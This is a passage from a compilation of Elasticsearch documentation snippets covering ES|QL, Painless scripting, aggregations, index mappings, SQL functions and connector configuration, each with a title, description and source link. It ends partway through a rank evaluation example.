https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM <logs-{now/d}>\n```\n\n----------------------------------------\n\nTITLE: Sigmoid Function in Script\nDESCRIPTION: This snippet illustrates using the sigmoid function within a script for custom scoring. The sigmoid function `sigmoid(value, k, a) = value^a/ (k^a + value^a)` is used with the 'my-int' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"sigmoid(doc['my-int'].value, 2, 1)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Action-Specific Condition with Revenue Threshold Check\nDESCRIPTION: Example showing how to implement an action-specific condition that checks if any play has exceeded $10,000 in sales. Uses Java Stream API's anyMatch for efficient boolean evaluation of the aggregation results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-condition-context.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST _watcher/watch/_execute\n{\n  \"watch\" : {\n    \"trigger\" : { \"schedule\" : { \"interval\" : \"24h\" } },\n    \"input\" : {\n      \"search\" : {\n        \"request\" : {\n          \"indices\" : [ \"seats\" ],\n          \"body\" : {\n            \"query\" : {\n              \"term\": { \"sold\": \"true\"}\n            },\n            \"size\": 0,\n            \"aggs\" : {\n              \"theatres\" : {\n                \"terms\" : { \"field\" : \"play\" },\n                \"aggs\" : {\n                  \"money\" : {\n                    \"sum\": {\n                      \"field\" : \"cost\",\n                      \"script\": {\n                       \"source\": \"doc.cost.value * doc.number.value\"\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"actions\" : {\n      \"my_log\" : {\n        \"condition\": {                                                \n          \"script\" :\n          \"\"\"\n            return ctx.payload.aggregations.theatres.buckets.stream()\n              .anyMatch(theatre -> theatre.money.value > 10000)       \n          \"\"\"\n        },\n        \"logging\" : {\n          \"text\" : \"At least one play has grossed over $10,000: {{ctx.payload.aggregations.theatres.buckets}}\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: String Stats with Missing Value Handling\nDESCRIPTION: Shows how to handle missing field values in string_stats aggregation by specifying a default value for missing fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-string-stats-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"message_stats\": {\n      \"string_stats\": {\n        \"field\": \"message.keyword\",\n        \"missing\": \"[empty message]\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic ILM Allocate Action with Replica and Shard Settings\nDESCRIPTION: Example showing how to configure an ILM policy with an allocate action that sets the number of replicas to 2 and limits total shards per node to 200.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-allocate.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"allocate\" : {\n            \"number_of_replicas\" : 2,\n            \"total_shards_per_node\" : 200\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using COUNT_DISTINCT in ESQL Aggregation\nDESCRIPTION: Demonstrates how to use COUNT_DISTINCT function to calculate the approximate number of distinct values across multiple IP address columns. The query performs aggregation on 'ip0' and 'ip1' columns from the 'hosts' table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM hosts\n| STATS COUNT_DISTINCT(ip0), COUNT_DISTINCT(ip1)\n```\n\n----------------------------------------\n\nTITLE: NestedDocument Class for Handling Nested Fields\nDESCRIPTION: This snippet defines the 'NestedDocument' class, which allows script management of nested fields within documents. It provides methods to access, check the size, existence, and removal of nested fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_5\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.field.NestedDocument {\n    WriteField field(String)\n    Stream fields(String)\n    boolean isEmpty()\n    int size()\n    boolean exists()\n    void remove()\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Document Routing in Elasticsearch\nDESCRIPTION: Examples of indexing and retrieving a document with a custom routing value instead of using the default document ID for routing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?routing=user1&refresh=true <1>\n{\n  \"title\": \"This is a document\"\n}\n\nGET my-index-000001/_doc/1?routing=user1 <2>\n```\n\n----------------------------------------\n\nTITLE: Second Order Derivative Example\nDESCRIPTION: Shows how to chain derivative aggregations to calculate both first and second order derivatives of monthly sales.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-derivative-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"sales_deriv\": {\n          \"derivative\": {\n            \"buckets_path\": \"sales\"\n          }\n        },\n        \"sales_2nd_deriv\": {\n          \"derivative\": {\n            \"buckets_path\": \"sales_deriv\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Input to Date Nanos in ESQL\nDESCRIPTION: This snippet describes a function that converts input to nanosecond-resolution date values (date_nanos) in Elasticsearch SQL. It specifies the valid range for date nanos and notes limitations on integer conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_date_nanos.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nConverts an input to a nanosecond-resolution date value (aka date_nanos).\n\n::::{note}\nThe range for date nanos is 1970-01-01T00:00:00.000000000Z to 2262-04-11T23:47:16.854775807Z, attempting to convert values outside of that range will result in null with a warning.  Additionally, integers cannot be converted into date nanos, as the range of integer nanoseconds only covers about 2 seconds after epoch.\n::::\n```\n\n----------------------------------------\n\nTITLE: Disabling Norms in Elasticsearch Using Update Mapping API\nDESCRIPTION: This code demonstrates how to disable norms for a text field using the Elasticsearch update mapping API. This is useful for fields that are only used for filtering or aggregations to save disk space.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/norms.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_mapping\n{\n  \"properties\": {\n    \"title\": {\n      \"type\": \"text\",\n      \"norms\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: General Dynamic Type Usage in Painless\nDESCRIPTION: Demonstrates how 'def' type variables can represent any primitive or reference type and can change the type they represent during execution. Shows primitive and reference type assignments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\ndef dp = 1;               <1>\ndef dr = new ArrayList(); <2>\ndr = dp;                  <3>\n```\n\n----------------------------------------\n\nTITLE: Complex HAVING with Multiple Aggregates\nDESCRIPTION: Demonstrates complex HAVING conditions using multiple aggregate functions and arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_22\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, MAX(salary) - MIN(salary) AS diff FROM emp GROUP BY languages HAVING diff - max % min > 0 AND AVG(salary) > 30000;\n```\n\n----------------------------------------\n\nTITLE: Using Equality (=) Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to use the equality (=) operator to filter results based on exact matches. This example selects the last_name field (aliased as 'l') from the test_emp index where emp_no equals 10000.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no = 10000 LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Filtering Documents by Matching Values in YAML\nDESCRIPTION: This example shows how to use KQL to filter documents that match specific values, such as a number, text, date, or boolean, including considerations for searching all fields or text fields with mapping settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.method: GET\n```\n\nLANGUAGE: yaml\nCODE:\n```\nHello\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.body.content: null pointer\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.body.content: \"null pointer\"\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.referrer: \"https://example.com\"\nhttp.request.referrer: https\\://example.com\n```\n\n----------------------------------------\n\nTITLE: Converting Multivalue to Single Value with MV_LAST in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_LAST function in ESQL to extract the last value from a multivalue expression. It combines the SPLIT function to create a multivalue column and then uses MV_LAST to select the last value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_last.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=\"foo;bar;baz\"\n| EVAL last_a = MV_LAST(SPLIT(a, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Character Class Examples with Square Brackets\nDESCRIPTION: Examples showing how to use square brackets to match any single character from a set of characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_10\n\nLANGUAGE: text\nCODE:\n```\n[abc]   # matches 'a', 'b', 'c'\n```\n\n----------------------------------------\n\nTITLE: Basic Reference Type Operations in Painless\nDESCRIPTION: Demonstrates creating a List instance, adding a value, and retrieving a value with calculation. Shows allocation of an ArrayList instance and casting to a List reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nList l = new ArrayList(); <1>\nl.add(1);                 <2>\nint i = l.get(0) + 2;     <3>\n```\n\n----------------------------------------\n\nTITLE: Token Output from Conditional Filter Example\nDESCRIPTION: The output tokens resulting from applying the conditional filter that converts tokens with fewer than 5 characters to lowercase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-condition-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ the, QUICK, BROWN, fox ]\n```\n\n----------------------------------------\n\nTITLE: Expanding Collapsed Results with Inner Hits\nDESCRIPTION: Shows how to expand collapsed search results using inner hits, allowing you to retrieve additional documents that share the same collapse key value. This example retrieves the 5 most recent documents for each user.id.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"GET /search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"user.id\",                       <1>\n    \"inner_hits\": {\n      \"name\": \"most_recent\",                  <2>\n      \"size\": 5,                              <3>\n      \"sort\": [ { \"@timestamp\": \"desc\" } ]    <4>\n    },\n    \"max_concurrent_group_searches\": 4        <5>\n  },\n  \"sort\": [\n    {\n      \"http.response.bytes\": {\n        \"order\": \"desc\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: High-precision Geohash Grid Aggregation with Geo Bounding Box in Elasticsearch\nDESCRIPTION: This snippet demonstrates a high-precision geohash_grid aggregation using a geo_bounding_box filter to narrow the subject area and avoid creating too many buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"zoomed-in\": {\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"location\": {\n            \"top_left\": \"POINT (4.9 52.4)\",\n            \"bottom_right\": \"POINT (5.0 52.3)\"\n          }\n        }\n      },\n      \"aggregations\": {\n        \"zoom1\": {\n          \"geohash_grid\": {\n            \"field\": \"location\",\n            \"precision\": 8\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Catalan Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom analyzer for the Catalan language in Elasticsearch using various filters, such as elision, stop words, keywords, and a stemmer. Required parameters include 'stopwords' and 'keywords' to customize filtering and processing of Catalan text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nPUT /catalan_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"catalan_elision\": {\n          \"type\":       \"elision\",\n          \"articles\":   [ \"d\", \"l\", \"m\", \"n\", \"s\", \"t\"]\n          ,\"articles_case\": true\n        },\n        \"catalan_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_catalan_\" <1>\n        },\n        \"catalan_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"example\"] <2>\n        },\n        \"catalan_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"catalan\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_catalan\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"catalan_elision\",\n            \"lowercase\",\n            \"catalan_stop\",\n            \"catalan_keywords\",\n            \"catalan_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Range Queries in Elasticsearch\nDESCRIPTION: Demonstrates various range query syntaxes for date, numeric, and string fields using inclusive and exclusive range specifications\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_7\n\nLANGUAGE: elasticsearch\nCODE:\n```\ndate:[2012-01-01 TO 2012-12-31]\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\ncount:[1 TO 5]\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\ntag:{alpha TO omega}\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\ncount:[10 TO *]\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nage:>10\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document with Nested Objects in Elasticsearch\nDESCRIPTION: Example of indexing a hierarchical JSON document containing nested objects. The document includes a top-level 'region' field and a nested 'manager' object, which itself contains an 'age' field and a nested 'name' object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/object.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{ <1>\n  \"region\": \"US\",\n  \"manager\": { <2>\n    \"age\":     30,\n    \"name\": { <3>\n      \"first\": \"John\",\n      \"last\":  \"Smith\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Mapping for Nested Documents in Elasticsearch\nDESCRIPTION: This snippet shows how to define a mapping for an 'issues' index with nested 'comments' in Elasticsearch. It demonstrates the structure for storing tags and nested comments with username and comment fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-reverse-nested-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /issues\n{\n  \"mappings\": {\n    \"properties\": {\n      \"tags\": { \"type\": \"keyword\" },\n      \"comments\": {                            <1>\n        \"type\": \"nested\",\n        \"properties\": {\n          \"username\": { \"type\": \"keyword\" },\n          \"comment\": { \"type\": \"text\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation with Extended Bounds\nDESCRIPTION: Example of using extended_bounds to force the histogram to include buckets within a specified range, even if there are no documents in those buckets. Useful when min_doc_count is 0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"query\": {\n    \"constant_score\": { \"filter\": { \"range\": { \"price\": { \"lte\": \"500\" } } } }\n  },\n  \"aggs\": {\n    \"prices\": {\n      \"histogram\": {\n        \"field\": \"price\",\n        \"interval\": 50,\n        \"extended_bounds\": {\n          \"min\": 0,\n          \"max\": 500\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Shortening Match Query Syntax\nDESCRIPTION: This snippet shows a simplified version of the match query syntax by combining the field and query parameters into a single line, effectively minimizing code footprint while executing a search operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"this is a test\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document with Nested Comments in Elasticsearch\nDESCRIPTION: This snippet shows how to index a document into the 'sales' index. The document includes tags and an array of nested comments, each with a username and comment text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /sales/_doc/1?refresh\n{\n  \"tags\": [ \"car\", \"auto\" ],\n  \"comments\": [\n    { \"username\": \"baddriver007\", \"comment\": \"This car could have better brakes\" },\n    { \"username\": \"dr_who\", \"comment\": \"Where's the autopilot? Can't find it\" },\n    { \"username\": \"ilovemotorbikes\", \"comment\": \"This car has two extra wheels\" }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Date Histogram with Calendar Interval in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure a date histogram aggregation with a calendar interval of one month in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SUM Aggregation Function in SQL\nDESCRIPTION: Returns the sum of input values in a numeric field. Ignores null values unless all values are null, in which case it returns null. Returns bigint for integer input and double for floating points.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SUM(salary) AS sum FROM emp;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ROUND(SUM(salary / 12.0), 1) AS sum FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Analyzing Employee Salaries by Hire Year and Programming Language in ESQL\nDESCRIPTION: This ESQL query processes employee data to calculate average salaries grouped by hire year and programming languages. It formats the hire date, computes average salaries, rounds the results, and sorts the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/statsGroupByMultipleValues.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL hired = DATE_FORMAT(\"yyyy\", hire_date)\n| STATS avg_salary = AVG(salary) BY hired, languages.long\n| EVAL avg_salary = ROUND(avg_salary)\n| SORT hired, languages.long\n```\n\n----------------------------------------\n\nTITLE: EC2 Discovery IAM Policy Configuration\nDESCRIPTION: AWS IAM policy JSON configuration that grants necessary permissions for EC2 discovery functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2-usage.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:DescribeInstances\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": [\n        \"*\"\n      ]\n    }\n  ],\n  \"Version\": \"2012-10-17\"\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Source Fields with Multiple Patterns in Elasticsearch\nDESCRIPTION: Example of using the _source parameter with an array of wildcard patterns to return only specific fields and their properties in the search response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"_source\": [ \"obj1.*\", \"obj2.*\" ],\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Basic Filters Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates how to create a filters aggregation with named buckets for error and warning messages in log data, showing the document count for each filter condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filters-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /logs/_bulk?refresh\n{ \"index\" : { \"_id\" : 1 } }\n{ \"body\" : \"warning: page could not be rendered\" }\n{ \"index\" : { \"_id\" : 2 } }\n{ \"body\" : \"authentication error\" }\n{ \"index\" : { \"_id\" : 3 } }\n{ \"body\" : \"warning: connection timed out\" }\n\nGET logs/_search\n{\n  \"size\": 0,\n  \"aggs\" : {\n    \"messages\" : {\n      \"filters\" : {\n        \"filters\" : {\n          \"errors\" :   { \"match\" : { \"body\" : \"error\"   }},\n          \"warnings\" : { \"match\" : { \"body\" : \"warning\" }}\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 9,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n  \"aggregations\": {\n    \"messages\": {\n      \"buckets\": {\n        \"errors\": {\n          \"doc_count\": 1\n        },\n        \"warnings\": {\n          \"doc_count\": 2\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using INSERT Function in Elasticsearch SQL\nDESCRIPTION: Returns a string where a specified number of characters have been deleted from the source string and a replacement string has been inserted at a specific position. All inputs must be non-null with a 1 MB limit for the resulting string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nINSERT(\n    source,      <1>\n    start,       <2>\n    length,      <3>\n    replacement) <4>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT INSERT('Elastic ', 8, 1, 'search');\n\nINSERT('Elastic ', 8, 1, 'search')\n----------------------------------\nElasticsearch\n```\n\n----------------------------------------\n\nTITLE: IIF Function\nDESCRIPTION: Implements if-then-else logic, returning one of two values based on a boolean condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nIIF(\n    expression,\n    expression,\n    [expression])\n```\n\n----------------------------------------\n\nTITLE: Setting custom node attribute via command line in Elasticsearch\nDESCRIPTION: Shows how to set a custom node attribute when starting an Elasticsearch node using the command line interface.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/shard-allocation.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\n./bin/elasticsearch -Enode.attr.size=medium\n```\n\n----------------------------------------\n\nTITLE: Removing Multiple Elasticsearch Plugins Simultaneously\nDESCRIPTION: Command to remove multiple Elasticsearch plugins in a single operation. This allows for efficient batch removal of plugins by specifying multiple plugin names in one command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/listing-removing-updating.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin remove [pluginname] [pluginname] ... [pluginname]\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Mapping for Highlighting Using Postings\nDESCRIPTION: This example shows how to configure the 'comment' field in an index mapping to enable highlighting using the postings list by setting 'index_options' to 'offsets'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_23\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comment\" : {\n        \"type\": \"text\",\n        \"index_options\" : \"offsets\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Elasticsearch Connection\nDESCRIPTION: cURL command to test the connection to the local Elasticsearch instance using basic authentication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s -X GET -u elastic:$ELASTIC_PASSWORD http://localhost:9200\n```\n\n----------------------------------------\n\nTITLE: Grouping Text Messages with CATEGORIZE in ESQL\nDESCRIPTION: Demonstrates how to use the CATEGORIZE function to group messages into categories and count occurrences. The query selects from sample_data, groups by categorized message patterns, and returns the count for each category.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/categorize.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| STATS count=COUNT() BY category=CATEGORIZE(message)\n```\n\n----------------------------------------\n\nTITLE: NER Inference Processor Configuration\nDESCRIPTION: Configuration settings for Named Entity Recognition inference processor, including results_field and tokenization options. Supports multiple tokenization models with configurable truncation behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"results_field\": \"<dependent_variable>_prediction\",\n  \"tokenization\": {\n    \"bert\": {\n      \"truncate\": \"first\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Scoring Unsold Seats by Row Proximity in Elasticsearch\nDESCRIPTION: A function score query that finds all unsold seats and applies a custom scoring formula based on row value. Lower row values receive higher scores using an inverse relationship (1.0 / row value).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-score-context.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /seats/_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"query\": {\n        \"match\": {\n          \"sold\": \"false\"\n        }\n      },\n      \"script_score\": {\n        \"script\": {\n          \"source\": \"1.0 / doc['row'].value\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Extended Stats Aggregation Query in Elasticsearch\nDESCRIPTION: Demonstrates how to perform a basic extended stats aggregation on a grade field to compute comprehensive statistics including variance and standard deviation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-extendedstats-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"grades_stats\": { \"extended_stats\": { \"field\": \"grade\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Multiple Fields with query_string\nDESCRIPTION: Demonstrates how to search across multiple fields using the fields parameter in the query_string query. This expands each query term to an OR clause across all specified fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"fields\": [ \"content\", \"name\" ],\n      \"query\": \"this AND that\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rule for Incident Service\nDESCRIPTION: JSON configuration to filter and index ServiceNow Incident documents based on specific number prefix\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"service\": \"Incident\",\n    \"query\": \"numberSTARTSWITHINC001\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Detailed Rank Evaluation Request Example\nDESCRIPTION: Demonstrates a complete rank evaluation request with multiple test queries and document ratings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"amsterdam_query\",                                  \n      \"request\": {                                              \n          \"query\": { \"match\": { 